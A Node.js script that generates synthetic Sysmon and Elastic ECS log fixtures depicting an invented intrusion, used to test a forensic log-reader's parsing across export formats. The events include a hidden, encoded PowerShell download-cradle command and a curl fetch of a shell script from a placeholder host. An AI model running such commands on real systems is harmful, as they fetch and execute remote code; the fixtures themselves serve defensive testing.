#!/usr/bin/env node
/**
 * Writes test/fixtures/: ONE synthetic incident, exported the ways an analyst actually receives a
 * Sysmon log, plus three ECS exports.
 *
 * Every Sysmon file holds the same fifteen events, so test-plugin.mjs can require that each wrapper
 * yields the same graph — the property that matters, since a format the reader half-understands
 * shows up as a missing link rather than an error. The shapes follow what each tool writes
 * (column order, attribute quoting, the "Record N" separators, the headerless message column);
 * every value is invented: documentation address blocks (RFC 5737, RFC 3849), `.example` names,
 * and hashes derived from labels rather than real binaries.
 *
 *   node test/make-fixtures.mjs   (the output is committed; rerun only to change the scenario)
 */
import { createHash } from 'node:crypto';
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const out = join(dirname(fileURLToPath(import.meta.url)), 'fixtures');
mkdirSync(out, { recursive: true });

const HOST = 'WKS-FIN-0142.acme.example';
const LOCAL_IP = '10.20.1.42';
const G = {
    explorer: '{4f3a1c2e-1b7a-6729-1a00-000000001c00}',
    winword: '{4f3a1c2e-2c8b-6729-4e02-000000001c00}',
    powershell: '{4f3a1c2e-2d13-6729-5102-000000001c00}',
    svchost: '{4f3a1c2e-0a01-6729-0c00-000000001c00}',
};
const IMG = {
    explorer: 'C:\\Windows\\explorer.exe',
    winword: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
    powershell: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    svchost: 'C:\\Windows\\System32\\svchost.exe',
    chrome: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
};
const hex = (label, alg) => createHash(alg).update(`host-artifacts fixture ${label}`).digest('hex');
const hashes = (label) =>
    `SHA1=${hex(label, 'sha1').toUpperCase()},MD5=${hex(label, 'md5').toUpperCase()},SHA256=${hex(label, 'sha256').toUpperCase()},IMPHASH=${hex(`${label} imphash`, 'md5').toUpperCase()}`;

const base = (time, guid, pid, image, user) => ({
    RuleName: '-',
    UtcTime: time,
    ProcessGuid: guid,
    ProcessId: String(pid),
    Image: image,
    User: user,
});

const create = (time, who, pid, cmd, parent, ppid, pe) => ({
    id: 1,
    title: 'Process Create',
    data: {
        RuleName: '-',
        UtcTime: time,
        ProcessGuid: G[who],
        ProcessId: String(pid),
        Image: IMG[who],
        FileVersion: pe.version,
        Description: pe.description,
        Product: pe.product,
        Company: pe.company,
        OriginalFileName: pe.original,
        CommandLine: cmd,
        CurrentDirectory: 'C:\\Users\\jkim\\Documents\\',
        User: 'ACME\\jkim',
        LogonGuid: '{4f3a1c2e-1b70-6729-2c1f-3a0000000000}',
        LogonId: '0x3A1F2C',
        TerminalSessionId: '1',
        IntegrityLevel: 'Medium',
        Hashes: hashes(who),
        ParentProcessGuid: G[parent],
        ParentProcessId: String(ppid),
        ParentImage: IMG[parent],
        ParentCommandLine: 'C:\\Windows\\Explorer.EXE',
        ParentUser: 'ACME\\jkim',
    },
});

const net = (time, who, pid, user, { proto = 'tcp', initiated = true, src, sport, dst, dport, dhost = '-', shost = '-', v6 = false }) => ({
    id: 3,
    title: 'Network connection detected',
    data: {
        ...base(time, G[who] ?? who, pid, IMG[who] ?? IMG.chrome, user),
        Protocol: proto,
        Initiated: String(initiated),
        SourceIsIpv6: String(v6),
        SourceIp: src,
        SourceHostname: shost,
        SourcePort: String(sport),
        SourcePortName: '-',
        DestinationIsIpv6: String(v6),
        DestinationIp: dst,
        DestinationHostname: dhost,
        DestinationPort: String(dport),
        DestinationPortName: dport === 443 ? 'https' : '-',
    },
});

const dns = (time, query, status, results) => ({
    id: 22,
    title: 'Dns query',
    data: {
        RuleName: '-',
        UtcTime: time,
        ProcessGuid: G.powershell,
        ProcessId: '6644',
        QueryName: query,
        QueryStatus: String(status),
        QueryResults: results,
        Image: IMG.powershell,
        User: 'ACME\\jkim',
    },
});

const PS_CMD = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA';
const EVENTS = [
    create('2026-11-04 01:10:02.117', 'winword', 4120, `"${IMG.winword}" /n "C:\\Users\\jkim\\Downloads\\invoice_1104.docm"`, 'explorer', 3880, {
        version: '16.0.17928.20156',
        description: 'Microsoft Word',
        product: 'Microsoft Office',
        company: 'Microsoft Corporation',
        original: 'WinWord.exe',
    }),
    // ParentCommandLine is the explorer's in both creates; powershell's parent is winword, whose own
    // start event above supplies the fields that matter (a weaker sighting never overwrites them).
    { ...create('2026-11-04 01:11:47.902', 'powershell', 6644, PS_CMD, 'winword', 4120, {
        version: '10.0.19041.3996',
        description: 'Windows PowerShell',
        product: 'Microsoft® Windows® Operating System',
        company: 'Microsoft Corporation',
        original: 'PowerShell.EXE',
    }) },
    net('2026-11-04 01:12:09.441', 'powershell', 6644, 'ACME\\jkim', { src: LOCAL_IP, sport: 50123, dst: '203.0.113.45', dport: 443 }),
    net('2026-11-04 01:17:09.452', 'powershell', 6644, 'ACME\\jkim', { src: LOCAL_IP, sport: 50177, dst: '203.0.113.45', dport: 443 }),
    net('2026-11-04 01:22:09.460', 'powershell', 6644, 'ACME\\jkim', { src: LOCAL_IP, sport: 50214, dst: '203.0.113.45', dport: 8443, dhost: 'edge-1.example.org' }),
    net('2026-11-04 01:13:00.000', 'powershell', 6644, 'ACME\\jkim', { src: LOCAL_IP, sport: 50131, dst: '10.20.0.5', dport: 445 }),
    net('2026-11-04 01:13:05.250', 'powershell', 6644, 'ACME\\jkim', { src: '127.0.0.1', sport: 50140, dst: '127.0.0.1', dport: 5985 }),
    dns('2026-11-04 01:12:08.990', 'update-check.example.net', 0, 'type:  5 edge-1.example.org;::ffff:203.0.113.45;'),
    dns('2026-11-04 01:17:08.990', 'update-check.example.net', 0, 'type:  5 edge-1.example.org;::ffff:203.0.113.45;'),
    dns('2026-11-04 01:12:01.004', 'wpad', 9003, '-'),
    dns('2026-11-04 01:12:01.311', '45.113.0.203.in-addr.arpa', 0, 'type:  12 edge-1.example.org;'),
    net('2026-11-04 01:05:31.004', 'svchost', 1088, 'NT AUTHORITY\\NETWORK SERVICE', {
        initiated: false,
        src: '198.51.100.23',
        sport: 51514,
        dst: LOCAL_IP,
        dport: 3389,
        dhost: HOST,
    }),
    // A collector that dropped the GUID (an empty `who` leaves ProcessGuid blank): counted, never imported.
    net('2026-11-04 01:14:00.000', '', 7720, 'ACME\\jkim', { src: LOCAL_IP, sport: 50190, dst: '192.0.2.80', dport: 80 }),
    {
        id: 5,
        title: 'Process terminated',
        data: base('2026-11-04 01:30:00.001', G.powershell, 6644, IMG.powershell, 'ACME\\jkim'),
    },
    net('2026-11-04 01:24:40.100', 'powershell', 6644, 'ACME\\jkim', {
        src: 'fd00:20:0:0:0:0:0:142',
        sport: 50300,
        dst: '2001:0db8:0000:0000:0000:ff00:0042:8329',
        dport: 443,
        v6: true,
    }),
];

const epochMs = (utc) => Date.parse(`${utc.replace(' ', 'T')}Z`);
const systemTime = (utc) => `${utc.replace(' ', 'T')}0000Z`; // 7 fractional digits, as Windows writes it
const message = (e) => [`${e.title}:`, ...Object.entries(e.data).map(([k, v]) => `${k}: ${v}`)].join('\r\n');
const xmlEsc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/'/g, '&apos;').replace(/"/g, '&quot;');
const csvCell = (v) => (/[",\r\n]/.test(String(v)) ? `"${String(v).replace(/"/g, '""')}"` : String(v));
const csv = (rows) => rows.map((r) => r.map(csvCell).join(',')).join('\r\n') + '\r\n';

// ---- wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml (no root element, single quotes) ----
writeFileSync(
    join(out, 'sysmon-wevtutil.xml'),
    EVENTS.map(
        (e, i) =>
            `<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>${e.id}</EventID><Version>5</Version><Level>4</Level><Task>${e.id}</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='${systemTime(e.data.UtcTime)}'/><EventRecordID>${18200 + i}</EventRecordID><Correlation/><Execution ProcessID='3112' ThreadID='4400'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>${HOST}</Computer><Security UserID='S-1-5-18'/></System><EventData>${Object.entries(e.data)
                .map(([k, v]) => (v === '' ? `<Data Name='${k}'/>` : `<Data Name='${k}'>${xmlEsc(v)}</Data>`))
                .join('')}</EventData></Event>`,
    ).join('\r\n') + '\r\n',
);

// ---- KAPE: EvtxECmd --csv (the event's own fields only in the Payload column) ----
const EVTX_ECMD_HEAD = ['RecordNumber', 'EventRecordId', 'TimeCreated', 'EventId', 'Level', 'Provider', 'Channel', 'ProcessId', 'ThreadId', 'Computer', 'ChunkNumber', 'UserId', 'MapDescription', 'UserName', 'RemoteHost', 'PayloadData1', 'PayloadData2', 'PayloadData3', 'PayloadData4', 'PayloadData5', 'PayloadData6', 'ExecutableInfo', 'HiddenRecord', 'SourceFile', 'Keywords', 'ExtraDataOffset', 'Payload'];
writeFileSync(
    join(out, 'sysmon-evtxecmd.csv'),
    csv([
        EVTX_ECMD_HEAD,
        ...EVENTS.map((e, i) => [
            String(i + 1),
            String(18200 + i),
            `${e.data.UtcTime}0000`,
            String(e.id),
            'Info',
            'Microsoft-Windows-Sysmon',
            'Microsoft-Windows-Sysmon/Operational',
            '3112', // the Sysmon service's own PID, not the event's process
            '4400',
            HOST,
            '0',
            'S-1-5-18',
            e.title,
            e.data.User,
            '',
            `ProcessID: ${e.data.ProcessId}, ProcessGUID: ${e.data.ProcessGuid}`,
            'RuleName: -',
            e.data.Hashes ?? '',
            '',
            '',
            '',
            e.data.CommandLine ?? '',
            'False',
            'C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx',
            'Classic',
            '0',
            JSON.stringify({
                EventData: {
                    Data: Object.entries(e.data).map(([k, v]) => (v === '' ? { '@Name': k } : { '@Name': k, '#text': v })),
                },
            }),
        ]),
    ]),
);

// ---- Winlogbeat → Elasticsearch export, one JSON object per line ----
writeFileSync(
    join(out, 'sysmon-winlogbeat.ndjson'),
    EVENTS.map((e, i) =>
        JSON.stringify({
            '@timestamp': new Date(epochMs(e.data.UtcTime)).toISOString(),
            event: { code: String(e.id), provider: 'Microsoft-Windows-Sysmon', kind: 'event', module: 'sysmon' },
            winlog: {
                channel: 'Microsoft-Windows-Sysmon/Operational',
                computer_name: HOST,
                event_id: String(e.id),
                provider_name: 'Microsoft-Windows-Sysmon',
                record_id: String(18200 + i),
                event_data: Object.fromEntries(Object.entries(e.data).filter(([, v]) => v !== '')),
            },
            host: { name: 'wks-fin-0142', hostname: 'wks-fin-0142' },
            agent: { type: 'winlogbeat', version: '8.15.3' },
        }),
    ).join('\n') + '\n',
);

// ---- Velociraptor Windows.EventLogs.EvtxHunter, JSON lines; EventData typed, Message rendered ----
writeFileSync(
    join(out, 'sysmon-velociraptor.json'),
    EVENTS.map((e, i) =>
        JSON.stringify({
            EventTime: new Date(epochMs(e.data.UtcTime)).toISOString(),
            Computer: HOST,
            Channel: 'Microsoft-Windows-Sysmon/Operational',
            Provider: 'Microsoft-Windows-Sysmon',
            EventID: e.id,
            EventRecordID: 18200 + i,
            UserSID: 'S-1-5-18',
            Username: 'NT AUTHORITY\\SYSTEM',
            EventData: Object.fromEntries(
                Object.entries(e.data).map(([k, v]) => [k, /^\d+$/.test(v) && /Id$|Port$/.test(k) ? Number(v) : v]),
            ),
            Message: message(e),
            OSPath: 'C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx',
        }),
    ).join('\n') + '\n',
);

// ---- evtx_dump -o json: "Record N" then a pretty object, values typed ----
const typed = (k, v) => (v === '' ? '' : /^\d+$/.test(v) && /ProcessId$|Port$/.test(k) ? Number(v) : v === 'true' ? true : v === 'false' ? false : v);
writeFileSync(
    join(out, 'sysmon-evtx_dump.txt'),
    EVENTS.map(
        (e, i) =>
            `Record ${18200 + i}\n${JSON.stringify(
                {
                    Event: {
                        '#attributes': { xmlns: 'http://schemas.microsoft.com/win/2004/08/events/event' },
                        System: {
                            Provider: { '#attributes': { Name: 'Microsoft-Windows-Sysmon', Guid: '5770385F-C22A-43E0-BF4C-06F5698FFBD9' } },
                            EventID: e.id,
                            Version: 5,
                            Level: 4,
                            Task: e.id,
                            Opcode: 0,
                            Keywords: '0x8000000000000000',
                            TimeCreated: { '#attributes': { SystemTime: `${e.data.UtcTime.replace(' ', 'T')}000Z` } },
                            EventRecordID: 18200 + i,
                            Correlation: null,
                            Execution: { '#attributes': { ProcessID: 3112, ThreadID: 4400 } },
                            Channel: 'Microsoft-Windows-Sysmon/Operational',
                            Computer: HOST,
                            Security: { '#attributes': { UserID: 'S-1-5-18' } },
                        },
                        EventData: Object.fromEntries(Object.entries(e.data).map(([k, v]) => [k, typed(k, v)])),
                    },
                },
                null,
                2,
            )}`,
    ).join('\n') + '\n',
);

// ---- Get-WinEvent … | Select TimeCreated, Id, MachineName, Message | ConvertTo-Json (PS 5.1) ----
writeFileSync(
    join(out, 'sysmon-getwinevent.json'),
    JSON.stringify(
        EVENTS.map((e) => ({
            TimeCreated: `/Date(${epochMs(e.data.UtcTime)})/`,
            Id: e.id,
            MachineName: HOST,
            ProviderName: 'Microsoft-Windows-Sysmon',
            Message: message(e),
        })),
        null,
        4,
    ).replace(/\/Date\(/g, '\\/Date(').replace(/\)\//g, ')\\/'),
);

// ---- Event Viewer "Save All Events As… CSV": five headers, a sixth headerless message column ----
writeFileSync(
    join(out, 'sysmon-eventviewer.csv'),
    csv([
        ['Level', 'Date and Time', 'Source', 'Event ID', 'Task Category'],
        ...EVENTS.map((e) => {
            const d = new Date(epochMs(e.data.UtcTime) + 9 * 3600e3); // the viewer's local time, KST
            const h = d.getUTCHours();
            const local = `${d.getUTCMonth() + 1}/${d.getUTCDate()}/${d.getUTCFullYear()} ${h % 12 || 12}:${String(d.getUTCMinutes()).padStart(2, '0')}:${String(d.getUTCSeconds()).padStart(2, '0')} ${h < 12 ? 'AM' : 'PM'}`;
            return ['Information', local, 'Microsoft-Windows-Sysmon', String(e.id), `${e.title} (rule: ${e.title.replace(/\s/g, '')})`, message(e)];
        }),
    ]),
);

// ---- A SIEM's CSV (Splunk with the Sysmon add-on): one column per field, GUIDs upper-cased ----
const SPLUNK_COLS = ['_time', 'host', 'source', 'sourcetype', 'EventCode', 'UtcTime', 'ProcessGuid', 'ProcessId', 'Image', 'CommandLine', 'User', 'IntegrityLevel', 'Hashes', 'OriginalFileName', 'Company', 'Product', 'FileVersion', 'Description', 'ParentProcessGuid', 'ParentProcessId', 'ParentImage', 'ParentCommandLine', 'ParentUser', 'Protocol', 'Initiated', 'SourceIp', 'SourcePort', 'SourceHostname', 'DestinationIp', 'DestinationPort', 'DestinationHostname', 'QueryName', 'QueryStatus', 'QueryResults'];
writeFileSync(
    join(out, 'sysmon-splunk.csv'),
    csv([
        SPLUNK_COLS,
        ...EVENTS.map((e) =>
            SPLUNK_COLS.map((c) => {
                if (c === '_time') return new Date(epochMs(e.data.UtcTime) + 9 * 3600e3).toISOString().replace('Z', '+09:00');
                if (c === 'host') return HOST;
                if (c === 'source') return 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational';
                if (c === 'sourcetype') return 'XmlWinEventLog';
                if (c === 'EventCode') return String(e.id);
                const v = e.data[c] ?? '';
                return /Guid$/.test(c) ? v.toUpperCase() : v;
            }),
        ),
    ]),
);

// ---- ECS: an Elastic Defend export (Linux host), one JSON object per line ----
const E = {
    sshd: 'NzY0NTMyNzEtMWQ3Ni00MmM0LWE4ZDEtYjI2ZWQ0ZGE1NmQzLTEwMjEtMTczMDY4MDAwMA==',
    bash: 'NzY0NTMyNzEtMWQ3Ni00MmM0LWE4ZDEtYjI2ZWQ0ZGE1NmQzLTQ0MTItMTczMDY4MzYwMA==',
    curl: 'NzY0NTMyNzEtMWQ3Ni00MmM0LWE4ZDEtYjI2ZWQ0ZGE1NmQzLTQ0NzgtMTczMDY4MzY1MA==',
};
const lnx = { name: 'build-07', hostname: 'build-07', os: { type: 'linux', family: 'debian' } };
const curlProc = { entity_id: E.curl, pid: 4478, name: 'curl', executable: '/usr/bin/curl', command_line: 'curl -fsSL https://cdn.example.com/x.sh' };
writeFileSync(
    join(out, 'ecs-defend.ndjson'),
    [
        {
            '@timestamp': '2026-11-04T03:20:40.000Z',
            event: { category: ['process'], type: ['start'], action: 'exec', kind: 'event' },
            process: {
                ...curlProc,
                hash: { sha256: hex('curl', 'sha256'), md5: hex('curl', 'md5'), sha1: hex('curl', 'sha1') },
                parent: { entity_id: E.bash, pid: 4412, name: 'bash', executable: '/usr/bin/bash', command_line: '-bash' },
            },
            user: { name: 'deploy' },
            host: lnx,
        },
        {
            '@timestamp': '2026-11-04T03:20:00.000Z',
            event: { category: ['process'], type: ['start'], action: 'exec', kind: 'event' },
            process: {
                entity_id: E.bash,
                pid: 4412,
                name: 'bash',
                executable: '/usr/bin/bash',
                command_line: '-bash',
                hash: { sha256: hex('bash', 'sha256') },
                parent: { entity_id: E.sshd, pid: 1021, name: 'sshd', executable: '/usr/sbin/sshd' },
            },
            user: { name: 'deploy' },
            host: lnx,
        },
        {
            '@timestamp': '2026-11-04T03:20:40.500Z',
            event: { category: ['network'], type: ['protocol', 'info'], action: 'lookup_result', kind: 'event' },
            dns: { question: { name: 'cdn.example.com', type: 'A' }, resolved_ip: ['198.51.100.77', '2001:db8:0:0:1::77'] },
            process: curlProc,
            host: lnx,
        },
        {
            '@timestamp': '2026-11-04T03:20:40.700Z',
            event: { category: ['network'], type: ['start'], action: 'connection_attempted', kind: 'event' },
            source: { ip: '10.40.0.7', port: 44120 },
            destination: { ip: '198.51.100.77', port: 443 },
            network: { direction: 'egress', transport: 'tcp' },
            process: curlProc,
            host: lnx,
        },
        {
            '@timestamp': '2026-11-04T03:10:12.000Z',
            event: { category: ['network'], type: ['start'], action: 'connection_accepted', kind: 'event' },
            source: { ip: '203.0.113.200', port: 61022 },
            destination: { ip: '10.40.0.7', port: 22 },
            network: { direction: 'ingress', transport: 'tcp' },
            process: { entity_id: E.sshd, pid: 1021, name: 'sshd', executable: '/usr/sbin/sshd' },
            host: lnx,
        },
        // A file event: an ECS record this pack does not read.
        {
            '@timestamp': '2026-11-04T03:20:41.000Z',
            event: { category: ['file'], type: ['creation'], action: 'creation', kind: 'event' },
            file: { path: '/tmp/x.sh' },
            process: curlProc,
            host: lnx,
        },
    ]
        .map((r) => JSON.stringify(r))
        .join('\n') + '\n',
);

// ---- Elastic Defend as Endpoint itself writes it, on a server with a public address ----
//
// ecs-defend.ndjson above uses ECS's own `ingress`/`egress`. Endpoint writes `incoming`/`outgoing`
// (Elastic's prebuilt rules match both spellings for that reason), logs every connection twice —
// when it opens and again as `disconnect_received` (event.type `end`) — and a lookup twice, as
// `lookup_requested` and `lookup_result`. A second SSH session comes without host.ip, as a column
// pick in Kibana leaves it, so `incoming` is all that says which end is the peer. The last record is
// a flow from another ECS source, with no direction at all, whose destination is one of the host's
// own addresses.
const W = {
    sshd: 'ZTI3ZTlhNWQtNjJiYi00ZGM1LWIwMDYtN2E1ZTJmMmIxYTAxLTgwMC0xNzkzNzU2MDAw',
    curl: 'ZTI3ZTlhNWQtNjJiYi00ZGM1LWIwMDYtN2E1ZTJmMmIxYTAxLTkxNS0xNzkzNzU2MzAw',
};
const web = { name: 'web-03', hostname: 'web-03', ip: ['198.51.100.5', 'fe80::5054:ff:fe12:3456'], os: { type: 'linux' } };
const sshdW = { entity_id: W.sshd, pid: 800, name: 'sshd', executable: '/usr/sbin/sshd' };
const curlW = { entity_id: W.curl, pid: 915, name: 'curl', executable: '/usr/bin/curl', command_line: 'curl -O https://dl.example.org/a' };
const flow = (time, type, action, direction, src, dst, proc, host = web) => ({
    '@timestamp': time,
    event: { category: ['network'], type: [type], action, kind: 'event' },
    source: { ip: src[0], port: src[1] },
    destination: { ip: dst[0], port: dst[1] },
    network: direction ? { direction, transport: 'tcp' } : { transport: 'tcp' },
    process: proc,
    host,
});
const webNoIp = { name: 'web-03', hostname: 'web-03' };
writeFileSync(
    join(out, 'ecs-defend-endpoint.ndjson'),
    [
        {
            '@timestamp': '2026-11-04T04:00:00.000Z',
            event: { category: ['process'], type: ['start'], action: 'exec', kind: 'event' },
            process: { ...sshdW, hash: { sha256: hex('sshd', 'sha256') } },
            user: { name: 'root' },
            host: web,
        },
        flow('2026-11-04T04:01:00.000Z', 'start', 'connection_accepted', 'incoming', ['203.0.113.200', 61022], ['198.51.100.5', 22], sshdW),
        flow('2026-11-04T04:09:00.000Z', 'end', 'disconnect_received', 'incoming', ['203.0.113.200', 61022], ['198.51.100.5', 22], sshdW),
        flow('2026-11-04T04:11:00.000Z', 'start', 'connection_accepted', 'incoming', ['203.0.113.202', 61400], ['198.51.100.5', 22], sshdW, webNoIp),
        flow('2026-11-04T04:12:00.000Z', 'end', 'disconnect_received', 'incoming', ['203.0.113.202', 61400], ['198.51.100.5', 22], sshdW, webNoIp),
        {
            '@timestamp': '2026-11-04T04:05:00.000Z',
            event: { category: ['process'], type: ['start'], action: 'exec', kind: 'event' },
            process: { ...curlW, hash: { sha256: hex('curl web-03', 'sha256') }, parent: sshdW },
            user: { name: 'deploy' },
            host: web,
        },
        {
            '@timestamp': '2026-11-04T04:05:00.100Z',
            event: { category: ['network'], type: ['protocol', 'info'], action: 'lookup_requested', kind: 'event' },
            dns: { question: { name: 'dl.example.org', type: 'A' } },
            process: curlW,
            host: web,
        },
        {
            '@timestamp': '2026-11-04T04:05:00.140Z',
            event: { category: ['network'], type: ['protocol', 'info'], action: 'lookup_result', kind: 'event' },
            dns: { question: { name: 'dl.example.org', type: 'A' }, resolved_ip: ['192.0.2.80'] },
            process: curlW,
            host: web,
        },
        flow('2026-11-04T04:05:00.200Z', 'start', 'connection_attempted', 'outgoing', ['198.51.100.5', 40112], ['192.0.2.80', 443], curlW),
        flow('2026-11-04T04:05:03.000Z', 'end', 'disconnect_received', 'outgoing', ['198.51.100.5', 40112], ['192.0.2.80', 443], curlW),
        flow('2026-11-04T04:20:00.000Z', 'connection', 'network_flow', null, ['203.0.113.201', 50001], ['198.51.100.5', 22], sshdW),
    ]
        .map((r) => JSON.stringify(r))
        .join('\n') + '\n',
);

// ---- Kibana Discover "Generate CSV": dotted ECS columns, the same curl connection ----
writeFileSync(
    join(out, 'ecs-kibana.csv'),
    csv([
        ['@timestamp', 'event.category', 'event.action', 'host.name', 'process.entity_id', 'process.pid', 'process.name', 'process.executable', 'destination.ip', 'destination.port', 'network.direction', 'network.transport'],
        ['Nov 4, 2026 @ 03:20:40.700', 'network', 'connection_attempted', 'build-07', E.curl, '4478', 'curl', '/usr/bin/curl', '198.51.100.77', '443', 'egress', 'tcp'],
        ['2026-11-04T03:25:02.000Z', 'network', 'connection_attempted', 'build-07', E.curl, '4478', 'curl', '/usr/bin/curl', '198.51.100.78', '443', 'egress', 'tcp'],
    ]),
);

console.log(`wrote ${out}`);
